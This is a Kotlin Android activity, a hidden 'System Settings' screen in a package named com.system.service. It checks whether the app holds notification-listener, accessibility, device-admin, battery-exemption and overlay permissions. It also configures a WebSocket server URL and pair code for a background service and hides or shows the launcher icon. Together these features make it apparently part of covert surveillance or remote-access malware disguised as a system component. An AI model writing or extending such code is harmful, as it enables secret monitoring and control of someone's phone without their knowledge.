package com.system.service.setup

import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import com.system.service.R
import com.system.service.core.CoreService
import com.system.service.core.ScoreCircleView
import com.system.service.monitors.NotificationMonitor

class HiddenSettingsActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_hidden_settings)
        title = "System Settings"

        val scoreCircle = findViewById<ScoreCircleView>(R.id.scoreCircle)
        val etUrl       = findViewById<EditText>(R.id.etServerUrl)
        val etPairCode  = findViewById<EditText>(R.id.etPairCode)
        val btnSave     = findViewById<Button>(R.id.btnSaveUrl)
        val btnShow     = findViewById<Button>(R.id.btnShowIcon)
        val btnHide     = findViewById<Button>(R.id.btnHideIcon)
        val btnRestart  = findViewById<Button>(R.id.btnRestart)
        val tvStatus    = findViewById<TextView>(R.id.tvConnStatus)

        // Animate permission health score (20 pts each × 5 permissions)
        scoreCircle.post {
            var score = 0
            val notifCn = ComponentName(this, NotificationMonitor::class.java)
            val notifFlat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
            if (notifFlat?.contains(notifCn.flattenToString()) == true) score += 20
            val accCn = ComponentName(packageName, "com.system.service.monitors.AccessibilityMonitor")
            val accEnabled = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: ""
            if (accEnabled.contains(accCn.flattenToString())) score += 20
            val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
            if (dpm.isAdminActive(ComponentName(this, com.system.service.core.DeviceAdminReceiver::class.java))) score += 20
            val pm = getSystemService(POWER_SERVICE) as PowerManager
            if (pm.isIgnoringBatteryOptimizations(packageName)) score += 20
            if (Settings.canDrawOverlays(this)) score += 20
            scoreCircle.animateTo(score)
        }

        val prefs = getSharedPreferences(CoreService.PREFS_NAME, MODE_PRIVATE)
        etUrl.setText(prefs.getString(CoreService.KEY_SERVER_URL, CoreService.SERVER_URL))
        etPairCode.setText(prefs.getString(CoreService.KEY_PAIR_CODE, ""))

        val isConn = CoreService.instance != null
        tvStatus.text = if (isConn) "Service: RUNNING" else "Service: STOPPED"
        tvStatus.setTextColor(if (isConn) 0xFF4CAF50.toInt() else 0xFFF44336.toInt())

        val launcherAlias = "${packageName}.setup.LauncherAlias"
        val iconEnabled = packageManager.getComponentEnabledSetting(
            ComponentName(packageName, launcherAlias)
        ) != PackageManager.COMPONENT_ENABLED_STATE_DISABLED
        btnShow.isEnabled = !iconEnabled
        btnHide.isEnabled = iconEnabled

        btnSave.setOnClickListener {
            val url  = etUrl.text.toString().trim()
            val code = etPairCode.text.toString().trim()
            if (url.startsWith("ws://") || url.startsWith("wss://")) {
                CoreService.SERVER_URL = url
                prefs.edit()
                    .putString(CoreService.KEY_SERVER_URL, url)
                    .putString(CoreService.KEY_PAIR_CODE, code)
                    .apply()
                // Fix: actually reconnect running service with new URL + pair code
                CoreService.instance?.reconnect()
                Toast.makeText(this, "Saved & reconnecting!", Toast.LENGTH_SHORT).show()
            } else {
                Toast.makeText(this, "URL must start with ws:// or wss://", Toast.LENGTH_SHORT).show()
            }
        }

        btnShow.setOnClickListener {
            packageManager.setComponentEnabledSetting(
                ComponentName(packageName, launcherAlias),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            btnShow.isEnabled = false; btnHide.isEnabled = true
            Toast.makeText(this, "Icon visible in launcher now", Toast.LENGTH_SHORT).show()
        }

        btnHide.setOnClickListener {
            packageManager.setComponentEnabledSetting(
                ComponentName(packageName, launcherAlias),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            btnShow.isEnabled = true; btnHide.isEnabled = false
            Toast.makeText(this, "Icon hidden from launcher", Toast.LENGTH_SHORT).show()
        }

        btnRestart.setOnClickListener {
            try {
                startForegroundService(Intent(this, CoreService::class.java))
                Toast.makeText(this, "Service restarted!", Toast.LENGTH_SHORT).show()
                tvStatus.text = "Service: RUNNING"
                tvStatus.setTextColor(0xFF4CAF50.toInt())
            } catch (e: Exception) {
                Toast.makeText(this, "Error: ${e.message}", Toast.LENGTH_SHORT).show()
            }
        }
    }
}
